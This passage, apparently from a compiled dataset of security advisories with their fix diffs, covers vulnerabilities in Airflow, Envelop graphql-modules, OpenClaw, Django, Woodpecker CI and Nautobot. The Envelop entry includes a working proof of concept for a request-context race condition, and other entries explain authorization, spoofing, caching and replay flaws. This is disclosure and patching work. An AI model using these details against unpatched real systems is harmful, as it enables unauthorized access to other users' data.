+    +    if token_str := request.cookies.get(COOKIE_NAME_JWT_TOKEN):
+    +        auth_manager.revoke_token(token_str)
+    -    # Revoke the current token before deleting the cookie
+    -    if token_str := request.cookies.get(COOKIE_NAME_JWT_TOKEN):
+    -        auth_manager.revoke_token(token_str)
+  FILE airflow-core/tests/unit/api_fastapi/core_api/routes/public/test_auth.py
+    +    def test_logout_revokes_token_when_logout_url_redirects(self, logout_client):
+    +        """Token must be revoked before the redirect when get_url_logout returns a URL."""
+    +        now = int(time.time())
+    +        auth_manager = logout_client.app.state.auth_manager
+    +        signer = auth_manager._get_token_signer()
+    +        token_payload = {
+    +            "sub": "admin",
+    +            "jti": "test-jti-redirect-456",
+    +            "exp": now + 3600,
+    +            "iat": now,
+    +            "nbf": now,
+    +            "aud": "apache-airflow",
+    +            "iss": signer.issuer,
+    +        }
+    +        token_str = jwt.encode(token_payload, signer._secret_key, algorithm=signer.algorithm)
+    +        logout_client.cookies.set(COOKIE_NAME_JWT_TOKEN, token_str)
+    +        with patch.object(auth_manager, "get_url_logout", return_value="http://external/logout"):
+    +            response = logout_client.get("/auth/logout", follow_redirects=False)
+    +        assert response.status_code == 307
+    +        assert response.headers["location"] == "http://external/logout"
+    +        assert RevokedToken.is_revoked("test-jti-redirect-456") is True
+
+=== GHSA-h3hw-29fv-2x75 sev=high pkgs=['npm:@envelop/graphql-modules']
+src=https://github.com/graphql-hive/envelop cwes=['CWE-362']
+SUMMARY: @envelop/graphql-modules has a Race Condition vulnerability
+DESC: ### Summary Context race condition when using `useGraphQLModules` plugin ### Details Related to: https://github.com/graphql-hive/graphql-modules/security/advisories/GHSA-53wg-r69p-v3r7 When 2 or more parallel requests are made which trigger the same service, the context of the requests is mixed up in the service when the context is injected via @ExecutionContext() and graphql-modules are used in Yoga with `useGraphQLModules(application)`. This issue was fixed in `graphql-modules` in `2.4.1` and `3.1.1` but using `useGraphQLModules` will bypass the `async_hooks` fix that was implemented. ### PoC Create the following `package.json` and run `npm i` ```json { "name": "poc", "scripts": { "compile": "tsc", "start": "npm run compile && node ./dist/src/index.js", "test": "npm run compile && node ./dist/test/bleedtest.js" }, "dependencies": { "@envelop/graphql-modules": "^9.0.0", "graphql-yoga": "^5.0.0", "graphql": "^16.10.0", "graphql-modules": "3.1.1", "reflect-metadata": "0.2.1", "axios": "^1.8.4" }, "devDependencies": { "@types/node": "^22.14.1", "typescript": "^5.8.3" } } ``` Define the app entrypoint: `src/index.ts` ```ts import { module } from "./module.js"; import { useGraphQLModules } from '@envelop/graphql-modules' import { createApplication } from "graphql-modules"; import { createServer } from 'node:http' import { randomUUID } from "node:crypto"; import { createYoga } from 'graphql-yoga'; const application = createApplication({ modules: [module] }) const yoga = createYoga({ schema: application.schema, plugins: [useGraphQLModules(application)], context() { return { requestId: randomUUID(), } } }) const server = createServer(yoga) server.listen(4001, '127.0.0.1', undefined, () => { console.info( `[Server] Running on http://localhost:4001/graphql` ) }) ``` Create the test module: `src/module.ts` ```ts import { createModule, gql } from "graphql-modules"; import Service from "./service.js"; const typeDefs = gql` type Book { id1: String id2: String } type Query { books: [Book] } `; export const module = createModule({ id: 'book-module', typeDefs: [typeDefs], providers: [Service], resolvers: { Query: { // return one empty book books: () => [{}], }, Book: { // return the requestId from the context id1: async (_root, _args, { injector } ) => { return injector.get(Service).get(); }, // return the requestId from the context of the service 100 ms later id2: async (_root, _args, { injector } ) => { await new Promise(resolve => setTimeout(resolve, 100)); return injector.get(Service).get() }, } } }) ``` Add the Service that's to be injected `src/service.ts` ```ts import { ExecutionContext, Injectable } from 'graphql-modules'; import 'reflect-metadata'; @Injectable() export default class Service { @ExecutionContext() private context: ExecutionContext; get() { return this.context.requestId; } } ``` Add the test case `test/bleedtest.js` ```ts import axios from 'axios'; const url = 'http://localhost:4001/graphql'; const query = `query { books { id1 id2 } }`; const makeGraphQLRequest = async () => { const response = await axios.post(url, { query }); const book = response.data.data.books[0] if (book.id1 !== book.id2) { throw new Error(`wrong response with ids ${(book.id1)} and ${(book.id2)}`) } } const numberOfRequests = 2; await Promise.all(Array.from( { length: numberOfRequests }, makeGraphQLRequest, )); ``` Then run the server with `npm run start` in one terminal and the testcase in another with `npm run test`. The returned IDs should be identical as they are both read from the context within the same request. However, there is a mismatch: ``` ❯ npm run test > poc@1.0.0 test > npm run compile && node ./dist/test/bleedtest.js > poc@1.0.0 compile > tsc file://<redacted>/dist/test/bleedtest.js:8 throw new Error(`wrong response with ids ${(book.id1)} and ${(book.id2)}`); ^ Error: wrong response with ids c2d83151-0922-4f25-a3e9-2f03acc1376a and e16c7335-0eaa-4386-b415-869ee4b05315 at makeGraphQLRequest (file://<redacted>/dist/test/bleedtest.js:8:15) at process.processTicksAndRejections (node:internal/process/task_queues:95:5) at async Promise.all (index 0) at async file://<redacted>/dist/test/bleedtest.js:12:1 ``` ### Impact Any application that uses `useGraphQLModules` from `@envelop/graphql-modules` along with services that inject the context using @ExecutionContext() from a singleton provider are at risk. The more traffic an application has, the higher the chance for parallel requests, the higher the risk.
+FIX commit https://github.com/graphql-hive/envelop/commit/ab49fa259a51d976c437e084114e070b99720ba9 status=200
+  MSG: graphql-modules plugin: Bind context to async execution avoiding race-conditions (#2843)
+  FILE .changeset/polite-baths-stop.md
+    +---
+    +'@envelop/graphql-modules': patch
+    +---
+    +Bind context to async execution avoiding race-conditions
+  FILE packages/plugins/graphql-modules/src/index.ts
+    -import type { Plugin, TypedExecutionArgs } from '@envelop/core';
+    -const graphqlModulesControllerSymbol = Symbol('GRAPHQL_MODULES');
+    -function destroy(context: TypedExecutionArgs<any>) {
+    -  if (context.contextValue?.[graphqlModulesControllerSymbol]) {
+    -    context.contextValue[graphqlModulesControllerSymbol].destroy();
+    -    context.contextValue[graphqlModulesControllerSymbol] = null;
+    -  }
+    -}
+    +import type { Plugin } from '@envelop/core';
+    -    onContextBuilding({ extendContext, context }) {
+    -      const controller = app.createOperationController({
+    -        context,
+    -        autoDestroy: false,
+    -      });
+    -      extendContext({
+    -        ...controller.context,
+    -        [graphqlModulesControllerSymbol]: controller,
+    -      });
+    -    },
+    -    onExecute({ args }) {
+    -      return {
+    -        onExecuteDone() {
+    -          destroy(args);
+    -        },
+    -      };
+    +    onExecute({ setExecuteFn, executeFn }) {
+  FILE packages/plugins/graphql-modules/test/use-graphql-modules.spec.ts
+  FILE scripts/match-graphql.js
+
+=== GHSA-8883-9w57-vwv6 sev=medium pkgs=['npm:openclaw']
+src=https://github.com/openclaw/openclaw cwes=['CWE-285', 'CWE-696', 'CWE-863']
+SUMMARY: OpenClaw: Mattermost callback dispatch allowed non-allowlisted sender actions
+DESC: ## Summary Mattermost interactive callback dispatch could run action handlers before normal sender authorization checks completed. ## Affected Packages / Versions - Package: `openclaw` (npm) - Affected: < 2026.3.22 - Fixed: >= 2026.3.22 - Latest released tag checked: `v2026.3.23-2` (`630f1479c44f78484dfa21bb407cbe6f171dac87`) - Latest published npm version checked: `2026.3.23-2` ## Fix Commit(s) - `a47722de7e3c9cbda8d5512747ca7e3bb8f6ee66` ## Release Status The fix shipped in `v2026.3.22` and remains present in `v2026.3.23` and `v2026.3.23-2`. ## Code-Level Confirmation - extensions/mattermost/src/mattermost/interactions.ts now requires callback authorization before dispatching actions. - extensions/mattermost/src/mattermost/monitor.ts routes callback authorization through the same sender and allowlist policy used for normal ingress. OpenClaw thanks @zpbrent for reporting.
+FIX commit https://github.com/openclaw/openclaw/commit/a47722de7e3c9cbda8d5512747ca7e3bb8f6ee66 status=200
+  MSG: Integrations: tighten inbound callback and allowlist checks (#46787) * Integrations: harden inbound callback and allowlist handling * Integrations: address review follow-ups * Update CHANGELOG.md * Ma
+  FILE CHANGELOG.md
+    +- Inbound policy hardening: tighten callback and webhook sender checks across Mattermost and Google Chat, match Nextcloud Talk rooms by stable room token, and 
+    -### Fixes
+  FILE extensions/googlechat/src/auth.test.ts
+    +import { beforeEach, describe, expect, it, vi } from "vitest";
+    +const mocks = vi.hoisted(() => ({
+    +  verifyIdToken: vi.fn(),
+    +}));
+    +vi.mock("google-auth-library", () => ({
+    +  GoogleAuth: class {},
+    +  OAuth2Client: class {
+    +    verifyIdToken = mocks.verifyIdToken;
+    +  },
+    +}));
+    +const { verifyGoogleChatRequest } = await import("./auth.js");
+    +function mockTicket(payload: Record<string, unknown>) {
+    +  mocks.verifyIdToken.mockResolvedValue({
+    +    getPayload: () => payload,
+    +  });
+    +}
+    +describe("verifyGoogleChatRequest", () => {
+    +  beforeEach(() => {
+    +    mocks.verifyIdToken.mockReset();
+    +  });
+    +  it("accepts Google Chat app-url tokens from the Chat issuer", async () => {
+    +    mockTicket({
+    +      email: "chat@system.gserviceaccount.com",
+    +      email_verified: true,
+    +    });
+    +    await expect(
+    +      verifyGoogleChatRequest({
+    +        bearer: "token",
+  FILE extensions/googlechat/src/auth.ts
+  FILE extensions/googlechat/src/monitor-webhook.ts
+  FILE extensions/mattermost/src/mattermost/interactions.test.ts
+  FILE extensions/mattermost/src/mattermost/interactions.ts
+  FILE extensions/mattermost/src/mattermost/monitor.ts
+  FILE extensions/nextcloud-talk/src/inbound.authz.test.ts
+  FILE extensions/nextcloud-talk/src/inbound.ts
+  FILE extensions/nextcloud-talk/src/policy.ts
+  FILE extensions/twitch/src/access-control.test.ts
+  FILE extensions/twitch/src/access-control.ts
+  FILE src/config/types.googlechat.ts
+  FILE src/config/zod-schema.providers-core.ts
+FIX commit https://github.com/openclaw/openclaw/commit/630f1479c44f78484dfa21bb407cbe6f171dac87 status=200
+  MSG: build: prepare 2026.3.23-2
+  FILE CHANGELOG.md
+    -- ModelStudio/Qwen: add standard (pay-as-you-go) DashScope endpoints for China and global Qwen API keys alongside the existing Coding Plan endpoints, and relab
+    -- UI/clarity: consolidate button primitives (`btn--icon`, `btn--ghost`, `btn--xs`), refine the Knot theme to a black-and-red palette with WCAG 2.1 AA contrast,
+    -- CSP/Control UI: compute SHA-256 hashes for inline `<script>` blocks in the served `index.html` and include them in the `script-src` CSP directive, keeping in
+    -- Plugins/ClawHub: resolve plugin API compatibility against the active runtime version at install time, and add regression coverage for current `>=2026.3.22` C
+    -- CLI/channel auth: auto-select the single login-capable configured channel for `channels login`/`logout` instead of relying on the outbound message-channel re
+    -- Control UI/auth: preserve operator scopes through the device-auth bypass path, ignore cached under-scoped operator tokens, and show a clear `operator.read` f
+    -- Plugins/uninstall: accept installed `clawhub:` specs and versionless ClawHub package names as uninstall targets, so `openclaw plugins uninstall clawhub:<pack
+    -- Auth/OpenAI tokens: stop live gateway auth-profile writes from reverting freshly saved credentials back to stale in-memory values, and make `models auth past
+    -- Agents/failover: classify generic `api_error` payloads as retryable only when they include transient failure signals, so MiniMax-style backend failures still
+    -- Diagnostics/cache trace: strip credential fields from cache-trace JSONL output while preserving non-sensitive diagnostic fields and image redaction metadata.
+    -- Docs/Feishu: replace `botName` with `name` in the channel config examples so the docs match the strict account schema for per-account display names. (#52753)
+    -- Doctor/plugins: make `openclaw doctor --fix` remove stale `plugins.allow` and `plugins.entries` refs left behind after plugin removal. Thanks @sallyom
+    -- Agents/replay: canonicalize malformed assistant transcript content before session-history sanitization so legacy or corrupted assistant turns stop crashing P
+    -- ClawHub/skills: keep updating already-tracked legacy Unicode slugs after the ASCII-only slug hardening, so older installs do not get stuck behind `Invalid sk
+    -- Infra/exec trust: preserve shell-multiplexer wrapper binaries for policy checks without breaking approved-command reconstruction, so BusyBox/ToyBox allowlist
+    -- LINE/runtime-api: pre-export overlapping runtime symbols before the `line-runtime` star export so jiti no longer throws `TypeError: Cannot redefine property`
+    -- CLI/cron: make `openclaw cron add|edit --at ... --tz <iana>` honor the requested local wall-clock time for offset-less one-shot datetimes, including DST boun
+    -- Commands/auth: stop slash-command authorization from crashing or dropping valid allowlists when channel `allowFrom` resolution hits unresolved SecretRef-back
+    +- ModelStudio/Qwen: add standard (pay-as-you-go) DashScope endpoints for China and global Qwen API keys alongside the existing Coding Plan endpoints, and relab
+    +- UI/clarity: consolidate button primitives (`btn--icon`, `btn--ghost`, `btn--xs`), refine the Knot theme to a black-and-red palette with WCAG 2.1 AA contrast,
+    +- CSP/Control UI: compute SHA-256 hashes for inline `<script>` blocks in the served `index.html` and include them in the `script-src` CSP directive, keeping in
+    +- Plugins/bundled runtimes: ship bundled plugin runtime sidecars like WhatsApp `light-runtime-api.js`, Matrix `runtime-api.js`, and other plugin runtime entry 
+    +- CLI/channel auth: auto-select the single configured login-capable channel for `channels login`/`logout`, harden channel ids against prototype-chain and contr
+    +- Auth/OpenAI tokens: stop live gateway auth-profile writes from reverting freshly saved credentials back to stale in-memory values, and make `models auth past
+    +- Control UI/auth: preserve operator scopes through the device-auth bypass path, ignore cached under-scoped operator tokens, and show a clear `operator.read` f
+    +- Plugins/ClawHub: resolve plugin API compatibility against the active runtime version at install time, and add regression coverage for current `>=2026.3.22` C
+    +- Plugins/uninstall: accept installed `clawhub:` specs and versionless ClawHub package names as uninstall targets, so `openclaw plugins uninstall clawhub:<pack
+    +- Agents/web_search: use the active runtime `web_search` provider instead of stale/default selection, so agent turns keep hitting the provider you actually con
+    +- Mistral/models: lower bundled Mistral max-token defaults to safe output budgets and teach `openclaw doctor --fix` to repair old persisted Mistral provider co
+    +- Config/warnings: suppress the confusing “newer OpenClaw” warning when a config written by a same-base correction release like `2026.3.23-2` is read by `2026.
+  FILE docs/.generated/plugin-sdk-api-baseline.json
+  FILE docs/.generated/plugin-sdk-api-baseline.jsonl
+
+=== GHSA-3h9f-r86x-qvjx sev=low pkgs=['pip:django']
+src=https://github.com/django/django cwes=['CWE-524']
+SUMMARY: Django: cache middleware may expose private responses when unrelated request cookies are present
+DESC: An issue was discovered in Django 6.0 before 6.0.7 and 5.2 before 5.2.16. `UpdateCacheMiddleware` and the `cache_page()` decorator cache responses that vary on cookies when the incoming request carries unrelated cookies, which allows remote attackers to read private data from the shared cache. Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank Chris Whyland for reporting this issue.
+FIX commit https://github.com/django/django/commit/64f9a2b2283fde3ec69fb0dfe441cf0f6f411ba3 status=200
+  MSG: [6.0.x] Fixed CVE-2026-48588 -- Prevented caching of responses that set cookies and vary on Cookie. `UpdateCacheMiddleware` skipped caching `Set-Cookie` responses that vary on `Cookie` only when the r
+  FILE django/middleware/cache.py
+    -        # sensitive) cookie in response to a cookie-less request.
+    -        if (
+    -            not request.COOKIES
+    -            and response.cookies
+    -            and has_vary_header(response, "Cookie")
+    -        ):
+    +        # sensitive) cookie while varying on Cookie.
+    +        if response.cookies and has_vary_header(response, "Cookie"):
+  FILE docs/releases/5.2.16.txt
+    +CVE-2026-48588: Potential exposure of private data via cached ``Set-Cookie`` response
+    +=====================================================================================
+    +:class:`~django.middleware.cache.UpdateCacheMiddleware` and
+    +:func:`~django.views.decorators.cache.cache_page` avoided caching responses
+    +that set a cookie while varying on ``Cookie`` only when the incoming request
+    +contained no cookies at all. When the request already carried an unrelated
+    +cookie (such as a language or theme preference cookie), the protection did not
+    +apply, allowing a response that sets a session or other sensitive cookie to be
+    +stored in Django's shared cache.
+    +This issue has severity "low" according to the :ref:`Django security policy
+    +<severity-levels>`.
+  FILE docs/releases/6.0.7.txt
+    +CVE-2026-48588: Potential exposure of private data via cached ``Set-Cookie`` response
+    +=====================================================================================
+    +:class:`~django.middleware.cache.UpdateCacheMiddleware` and
+    +:func:`~django.views.decorators.cache.cache_page` avoided caching responses
+    +that set a cookie while varying on ``Cookie`` only when the incoming request
+    +contained no cookies at all. When the request already carried an unrelated
+    +cookie (such as a language or theme preference cookie), the protection did not
+    +apply, allowing a response that sets a session or other sensitive cookie to be
+    +stored in Django's shared cache.
+    +This issue has severity "low" according to the :ref:`Django security policy
+    +<severity-levels>`.
+  FILE tests/cache/tests.py
+FIX commit https://github.com/django/django/commit/6e365f8d01f2ba0bbd90968d76a42600fb8bc4b1 status=200
+  MSG: Fixed CVE-2026-48588 -- Prevented caching of responses that set cookies and vary on Cookie. `UpdateCacheMiddleware` skipped caching `Set-Cookie` responses that vary on `Cookie` only when the request h
+  FILE django/middleware/cache.py
+    -        # sensitive) cookie in response to a cookie-less request.
+    -        if (
+    -            not request.COOKIES
+    -            and response.cookies
+    -            and has_vary_header(response, "Cookie")
+    -        ):
+    +        # sensitive) cookie while varying on Cookie.
+    +        if response.cookies and has_vary_header(response, "Cookie"):
+  FILE docs/releases/5.2.16.txt
+    +CVE-2026-48588: Potential exposure of private data via cached ``Set-Cookie`` response
+    +=====================================================================================
+    +:class:`~django.middleware.cache.UpdateCacheMiddleware` and
+    +:func:`~django.views.decorators.cache.cache_page` avoided caching responses
+    +that set a cookie while varying on ``Cookie`` only when the incoming request
+    +contained no cookies at all. When the request already carried an unrelated
+    +cookie (such as a language or theme preference cookie), the protection did not
+    +apply, allowing a response that sets a session or other sensitive cookie to be
+    +stored in Django's shared cache.
+    +This issue has severity "low" according to the :ref:`Django security policy
+    +<severity-levels>`.
+  FILE docs/releases/6.0.7.txt
+    +CVE-2026-48588: Potential exposure of private data via cached ``Set-Cookie`` response
+    +=====================================================================================
+    +:class:`~django.middleware.cache.UpdateCacheMiddleware` and
+    +:func:`~django.views.decorators.cache.cache_page` avoided caching responses
+    +that set a cookie while varying on ``Cookie`` only when the incoming request
+    +contained no cookies at all. When the request already carried an unrelated
+    +cookie (such as a language or theme preference cookie), the protection did not
+    +apply, allowing a response that sets a session or other sensitive cookie to be
+    +stored in Django's shared cache.
+    +This issue has severity "low" according to the :ref:`Django security policy
+    +<severity-levels>`.
+  FILE tests/cache/tests.py
+FIX commit https://github.com/django/django/commit/721685aa7799cc9327bd202cd1f70bd012ca95a7 status=200
+  MSG: [5.2.x] Fixed CVE-2026-48588 -- Prevented caching of responses that set cookies and vary on Cookie. `UpdateCacheMiddleware` skipped caching `Set-Cookie` responses that vary on `Cookie` only when the r
+  FILE django/middleware/cache.py
+    -        # sensitive) cookie in response to a cookie-less request.
+    -        if (
+    -            not request.COOKIES
+    -            and response.cookies
+    -            and has_vary_header(response, "Cookie")
+    -        ):
+    +        # sensitive) cookie while varying on Cookie.
+    +        if response.cookies and has_vary_header(response, "Cookie"):
+  FILE docs/releases/5.2.16.txt
+    +CVE-2026-48588: Potential exposure of private data via cached ``Set-Cookie`` response
+    +=====================================================================================
+    +:class:`~django.middleware.cache.UpdateCacheMiddleware` and
+    +:func:`~django.views.decorators.cache.cache_page` avoided caching responses
+    +that set a cookie while varying on ``Cookie`` only when the incoming request
+    +contained no cookies at all. When the request already carried an unrelated
+    +cookie (such as a language or theme preference cookie), the protection did not
+    +apply, allowing a response that sets a session or other sensitive cookie to be
+    +stored in Django's shared cache.
+    +This issue has severity "low" according to the :ref:`Django security policy
+    +<severity-levels>`.
+  FILE tests/cache/tests.py
+    -        Django must prevent caching of responses that set a user-specific (and
+    -        maybe security sensitive) cookie in response to a cookie-less request.
+    +        Responses that set a new cookie not present in the request are not
+    +        cached, regardless of whether the request already had other cookies.
+    -        request = self.factory.get("/view/")
+    -        csrf_middleware = CsrfViewMiddleware(csrf_view)
+    -        csrf_middleware.process_view(request, csrf_view, (), {})
+    -        cache_middleware = CacheMiddleware(csrf_middleware)
+    +        for headers in ({}, {"HTTP_COOKIE": "unrelated=value"}):
+    +            with self.subTest(headers=headers):
+    +                request = self.factory.get("/view/", **headers)
+
+=== GHSA-g7mm-9vx7-jm7h sev=high pkgs=['go:go.woodpecker-ci.org/woodpecker/v3']
+src=https://github.com/woodpecker-ci/woodpecker cwes=['CWE-290', 'CWE-639']
+SUMMARY: Woodpecker gRPC agent_id metadata can be spoofed- cross-tenant agent impersonation
+DESC: ### Impact A vulnerability in Woodpecker CI's gRPC layer allowed any authenticated agent to impersonate any other agent on the same server by injecting a forged `agent_id` value into outgoing gRPC metadata. The server correctly verified the JWT token but then discarded the verified agent identity in favor of the client-supplied value. ### Patches Direct patch: https://github.com/woodpecker-ci/woodpecker/pull/6567 Later proper fix: https://github.com/woodpecker-ci/woodpecker/pull/6569 ### Workarounds Disable org agents (`WOODPECKER_DISABLE_USER_AGENT_REGISTRATION=true`) and delete existing ones ### Resources Public ref: https://github.com/woodpecker-ci/woodpecker/issues/6541 Private com: https://github.com/woodpecker-ci/woodpecker-security/issues/21
+FIX pull https://github.com/woodpecker-ci/woodpecker/pull/6567 status=200
+  PR: Server: make sure agent_id can not be spoofed by agent | address https://github.com/woodpecker-ci/woodpecker/issues/6541 make sure metadata header can not be spoofed.
+  MSG: Set grpc metadata correctly (#6567) address #6541 make sure metadata header can not be spoofed.
+  FILE server/rpc/authorizer.go
+    -	md.Append("agent_id", fmt.Sprintf("%d", claims.AgentID))
+    +	md.Set("agent_id", fmt.Sprintf("%d", claims.AgentID))
+FIX pull https://github.com/woodpecker-ci/woodpecker/pull/6569 status=200
+  PR: server: for grpc store extracted agentID in context | long term fix for: https://github.com/woodpecker-ci/woodpecker/issues/6541 simple backport is found at https://github.com/woodpecker-ci/woodpecker/pull/6567
+  MSG: server: for grpc store extracted agentID in context (#6569) long term fix for: #6541 simple backport is found at #6567
+  FILE server/rpc/authorizer.go
+    -//  3. Extract and add agent_id to metadata for downstream handlers
+    +//  3. Extract agent_id from JWT claims and store in context
+    -	"fmt"
+    -// authorize validates JWT and enriches context with agent_id metadata.
+    +// authorize validates JWT and injects verified agent_id into the context.
+    -	md.Append("agent_id", fmt.Sprintf("%d", claims.AgentID))
+    +	// inject agentID into context
+    +	ctx = context.WithValue(ctx, agentIDKey, claims.AgentID)
+    -	return metadata.NewIncomingContext(ctx, md), nil
+    +	return ctx, nil
+  FILE server/rpc/authorizer_test.go
+    -		md, ok := metadata.FromIncomingContext(newCtx)
+    +		rawAgentID := newCtx.Value(agentIDKey)
+    +		agentID, ok := rawAgentID.(int64)
+    -		agentIDs := md["agent_id"]
+    -		require.Len(t, agentIDs, 1)
+    -		assert.Equal(t, "77", agentIDs[0])
+    +		assert.EqualValues(t, 77, agentID)
+    -		assert.Equal(t, []string{"10"}, md["agent_id"])
+    +		agentID, _ := (newCtx.Value(agentIDKey)).(int64)
+    +		assert.EqualValues(t, 10, agentID)
+    -		md, ok := metadata.FromIncomingContext(capturedCtx)
+    +		_, ok := metadata.FromIncomingContext(capturedCtx)
+    -		assert.Equal(t, []string{"21"}, md["agent_id"])
+    +		agentID, _ := (capturedCtx.Value(agentIDKey)).(int64)
+    +		assert.EqualValues(t, 21, agentID)
+    +		capturedCtx := capturedStream.Context()
+    -		md, ok := metadata.FromIncomingContext(capturedStream.Context())
+    +		_, ok := metadata.FromIncomingContext(capturedCtx)
+    -		assert.Equal(t, []string{"33"}, md["agent_id"])
+    +		agentID, _ := (capturedCtx.Value(agentIDKey)).(int64)
+  FILE server/rpc/rpc.go
+  FILE server/rpc/rpc_integration_test.go
+  FILE server/rpc/rpc_test.go
+
+=== GHSA-rh67-4c8j-hjjh sev=medium pkgs=['pip:nautobot']
+src=https://github.com/nautobot/nautobot cwes=['CWE-200']
+SUMMARY: Nautobot may allows uploaded media files to be accessible without authentication
+DESC: ### Impact Files uploaded by users to Nautobot's `MEDIA_ROOT` directory, including DeviceType image attachments as well as images attached to a Location, Device, or Rack, are served to users via a URL endpoint that was not enforcing user authentication. As a consequence, such files can be retrieved by anonymous users who know or can guess the correct URL for a given file. For DeviceType image attachments, a mitigating factor is that no URL endpoint exists for listing the contents of the `devicetype-images/` subdirectory, and the file names are as specified by the uploading user, so any given DeviceType image attachment can only be retrieved by correctly guessing its file name. Similarly, for all other image attachments, while the images *can* be listed by accessing the `/api/extras/image-attachments/` endpoint *as an authenticated user only*, absent that authenticated access, accessing the files would again require guessing file names correctly. ### Patches Nautobot v2.4.10 and v1.6.32 will address this issue by adding enforcement of Nautobot user authentication to this endpoint. ### Workarounds No workaround other than applying the patch given in https://github.com/nautobot/nautobot/pull/6672 (2.x) or https://github.com/nautobot/nautobot/pull/6703 (1.6) ### References _Are there any links users can visit to find out more?_ - https://github.com/nautobot/nautobot/commit/9c892dc300429948a4714f743c9c2879d8987340 - https://github.com/nautobot/nautobot/commit/d99a53b065129cff3a0fa9abe7355a9ef1ad4c95
+FIX pull https://github.com/nautobot/nautobot/pull/6672 status=200
+  PR: Requesting media files requires authentication | <!-- Thank you for your interest in contributing to Nautobot! Please note that our contribution policy recommends that a feature request or bug report be opened for approval prior to filing a pull request. This helps avoid wasting time and effort on something that we might not be able to accept. Please indicate the relevant feature request or bug report below. --> # Closes #DNE # What's Changed <!
+  MSG: Requesting media files requires authentication (#6672) * Requesting static media requires authentication * Resolve PR feedback * Simpler approach, enhance testing a bit * Change fragment * Ruff * fix 
+  FILE changes/6672.security
+    +Added enforcement of user authentication when serving uploaded media files (GHSA-rh67-4c8j-hjjh).
+  FILE nautobot/core/tests/test_views.py
+    +import os
+    +import tempfile
+    +class MediaViewTestCase(TestCase):
+    +    def test_media_unauthenticated(self):
+    +        """
+    +        Test that unauthenticated users are redirected to login when accessing media files whether they exist or not.
+    +        """
+    +        with tempfile.TemporaryDirectory() as temp_dir:
+    +            with override_settings(
+    +                MEDIA_ROOT=temp_dir,
+    +                BRANDING_FILEPATHS={"logo": os.path.join("branding", "logo.txt")},
+    +            ):
+    +                file_path = os.path.join(temp_dir, "foo.txt")
+    +                url = reverse("media", kwargs={"path": "foo.txt"})
+    +                self.client.logout()
+    +                # Unauthenticated request to nonexistent media file should redirect to login page
+    +                response = self.client.get(url)
+    +                self.assertRedirects(
+    +                    response, expected_url=f"{reverse('login')}?next={url}", status_code=302, target_status_code=200
+    +                )
+    +                # Unauthenticated request to existent media file should redirect to login page as well
+    +                with open(file_path, "w") as f:
+    +                    f.write("Hello, world!")
+    +                response = self.client.get(url)
+    +                self.assertRedirects(
+    +                    response, expected_url=f"{reverse('login')}?next={url}", status_code=302, target_status_code=200
+    +                )
+    +    def test_branding_media(self):
+    +        """
+  FILE nautobot/core/urls.py
+  FILE nautobot/core/views/__init__.py
+FIX pull https://github.com/nautobot/nautobot/pull/6703 status=200
+  PR: [LTM] require authentication for media files | # What's Changed Direct cross-port of #6672 to LTM 1.6 branch.
+  MSG: [LTM] require authentication for media files (#6703)
+  FILE changes/6672.security
+    +Added enforcement of user authentication when serving uploaded media files (GHSA-rh67-4c8j-hjjh).
+  FILE nautobot/core/tests/test_views.py
+    +import os
+    +import tempfile
+    +class MediaViewTestCase(TestCase):
+    +    def test_media_unauthenticated(self):
+    +        """
+    +        Test that unauthenticated users are redirected to login when accessing media files whether they exist or not.
+    +        """
+    +        with tempfile.TemporaryDirectory() as temp_dir:
+    +            with override_settings(
+    +                MEDIA_ROOT=temp_dir,
+    +                BRANDING_FILEPATHS={"logo": os.path.join("branding", "logo.txt")},
+    +            ):
+    +                file_path = os.path.join(temp_dir, "foo.txt")
+    +                url = reverse("media", kwargs={"path": "foo.txt"})
+    +                self.client.logout()
+    +                # Unauthenticated request to nonexistent media file should redirect to login page
+    +                response = self.client.get(url)
+    +                self.assertRedirects(
+    +                    response, expected_url=f"{reverse('login')}?next={url}", status_code=302, target_status_code=200
+    +                )
+    +                # Unauthenticated request to existent media file should redirect to login page as well
+    +                with open(file_path, "w") as f:
+    +                    f.write("Hello, world!")
+    +                response = self.client.get(url)
+    +                self.assertRedirects(
+    +                    response, expected_url=f"{reverse('login')}?next={url}", status_code=302, target_status_code=200
+    +                )
+    +    def test_branding_media(self):
+    +        """
+  FILE nautobot/core/urls.py
+  FILE nautobot/core/views/__init__.py
+FIX commit https://github.com/nautobot/nautobot/commit/9c892dc300429948a4714f743c9c2879d8987340 status=200
+  (same commit message as a fix above; diff not repeated)
+
+=== GHSA-37v6-fxx8-xjmx sev=medium pkgs=['npm:openclaw']
+src=https://github.com/openclaw/openclaw cwes=['CWE-294']
+SUMMARY: OpenClaw: Telnyx Webhook Replay Detection Bypass via Base64 Signature Re-encoding
+DESC: ## Summary Telnyx Webhook Replay Detection Bypass via Base64 Signature Re-encoding ## Current Maintainer Triage - Status: narrow - Normalized severity: low - Assessment: Shipped v2026.3.28 replay hashing treated equivalent Telnyx Base64/Base64URL signatures as distinct requests, but signature verification still held, so lower to low. ## Affected Packages / Versions - Package: `openclaw` (npm) - Latest published npm version: `2026.3.31` - Vulnerable version range: `<=2026.3.28` - Patched versions: `>= 2026.3.31` - First stable tag containing the fix: `v2026.3.31` ## Fix Commit(s) - `ad77666054651c1fd77b1dc60fd6a8db6600a29a` — 2026-03-30T20:01:43+01:00 ## Release Process Note - The fix is already present in released version `2026.3.31`. - This draft looks ready for final maintainer disposition or publication, not additional code-fix work. OpenClaw thanks @AntAISecurityLab for reporting.
+FIX commit https://github.com/openclaw/openclaw/commit/ad77666054651c1fd77b1dc60fd6a8db6600a29a status=200
+  MSG: fix(voice-call): canonicalize Telnyx replay request keys (#57829)
+  FILE extensions/voice-call/src/webhook-security.test.ts
+    +  it("treats Base64 and Base64URL signatures as the same replayed request", () => {
+    +    const { publicKey, privateKey } = crypto.generateKeyPairSync("ed25519");
+    +    const pemPublicKey = publicKey.export({ format: "pem", type: "spki" }).toString();
+    +    const timestamp = String(Math.floor(Date.now() / 1000));
+    +    const rawBody = JSON.stringify({
+    +      data: { event_type: "call.initiated", payload: { call_control_id: "call-1" } },
+    +      nonce: crypto.randomUUID(),
+    +    });
+    +    const signedPayload = `${timestamp}|${rawBody}`;
+    +    const signature = crypto.sign(null, Buffer.from(signedPayload), privateKey).toString("base64");
+    +    const urlSafeSignature = signature.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
+    +    const first = verifyTelnyxWebhook(
+    +      {
+    +        headers: {
+    +          "telnyx-signature-ed25519": signature,
+    +          "telnyx-timestamp": timestamp,
+    +        },
+    +        rawBody,
